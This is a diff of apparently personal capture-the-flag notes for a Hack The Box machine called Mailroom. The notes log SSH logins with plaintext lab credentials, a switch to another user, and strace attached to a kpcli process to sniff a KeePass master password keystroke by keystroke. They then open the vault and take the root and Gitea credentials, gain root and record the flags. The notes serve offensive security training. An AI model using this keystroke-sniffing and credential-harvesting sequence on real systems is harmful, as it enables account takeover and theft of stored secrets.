@@ -11,14 +11,19 @@
 
 //CREDS:
 	//User: tristan@mailroom.htb
-    //Pass: 69trisRulez!
+	//Pass: 69trisRulez!
 
-    //User: matthew
-    //Pass: HueLover83#
+	//User: matthew
+	//Pass: HueLover83#
+	
+	//KeePass MasterPassword: !sEcUr3p4$$w0rd9
 
+	//User: root
+	//Pass: a$gBa3!GA8 
+		
 //Flags:
 #User:		6e28d2a70bd32f40077136739aa6e9bd
-#System:
+#System:	6207292842c40d69a095f4337dfceabf
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -108,7 +113,6 @@ feroxbuster -k -u http://10.129.250.179 -o feroxbuster.out
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-
 // gobuster vHOst --
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
@@ -133,7 +137,6 @@ nikto -h http://10.129.250.179 -o nikto_scan.txt
 + /README.md: Readme Found.
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
 
 // BURP
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -1102,8 +1105,122 @@ strace -p $(ps -ef | egrep 'kpcli|perl' | egrep -v 'grep' | awk '{ print $2 }')
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+########
+#BREAK
+########
+
+2023-04-29 20:52:24 CDT -- BACK AGAIN
+
+// REBIRTH x2
+// I have SSH creds for Tristan that can then su to Mathew
+// This should be quick
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.203.73\tstaff-review-panel.mailroom.htb git.mailroom.htb mailroom.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+2023-04-29 20:54:46 CDT -- 
+// connect SSH
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" tristan@mailroom.htb
+//Pass: 69trisRulez!
+
+//SUCCESS
+
+2023-04-29 20:58:10 CDT -- 
+su - matthew
+//Pass: HueLover83#
+
+id
+uid=1001(matthew) gid=1001(matthew) groups=1001(matthew)
+
+//Back to where I was last night
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// kpcli investigation
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//strace the kpcli process to an output file to review
+2023-04-29 21:02:31 CDT -- 
+strace -o strace.out -p $(ps -ef | egrep 'kpcli|perl' | egrep -v 'grep' | awk '{ print $2 }')
+
+strace: Process 260647 attached
+
+less strace.out
+//Found the lines:
+//write(1, "Please provide the master passwo"..., 36) = 36
+	read(0, 0x5597f9e8aea0, 8192)           = -1 EAGAIN (Resource temporarily unavailable)
+	read(0, "!", 8192)                      = 1
+
+2023-04-29 21:26:05 CDT -- 
+//Create a grep filter to try and pull master password
+//This was fun to figure out
+egrep '8192' strace.out | egrep '= 1$' | awk '{ print $2}' | tr -d '",\n'
+
+// Possible Master Password:
+// !sEcUr3p4$$w01\10rd9\n
+
+// Remove wierd trash in the middle:
+// MasterPassword: !sEcUr3p4$$w0rd9
+
+// Already copied Matthew's kdbx file with:
+// scp -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" tristan@mailroom.htb:/home/matthew/personal.kdbx .
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Keypass
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+sudo apt install keepass2
+
+keepass2 personal.kdbx
+//MasterPassword: !sEcUr3p4$$w0rd9  
+
+//KeePass programs runs, right-click and copy root password
+root acc: a$gBa3!GA8
+
+//[*]EXTRA:
+food_account			| matthew_doordash:fake_password
+Gitea Admin account		| administrator:CZTwvKT7yHyEdb4
+Gitea Database password	| gitea:gitea_l33t_p@ssw04d
+My Gitea Account		| matthew:HueLover83#
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// root login
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-29 21:46:14 CDT -- 
+su - 
+//Pass: a$gBa3!GA8
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/root.txt 
+//6207292842c40d69a095f4337dfceabf
+
+# PWNED 
+ \
+   .-.
+ ((x x)) xGh05t
+  | - \-|
+   \   \
+   `~~~'
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-
+2023-04-29 21:50:11 CDT -- COMPLETE
 
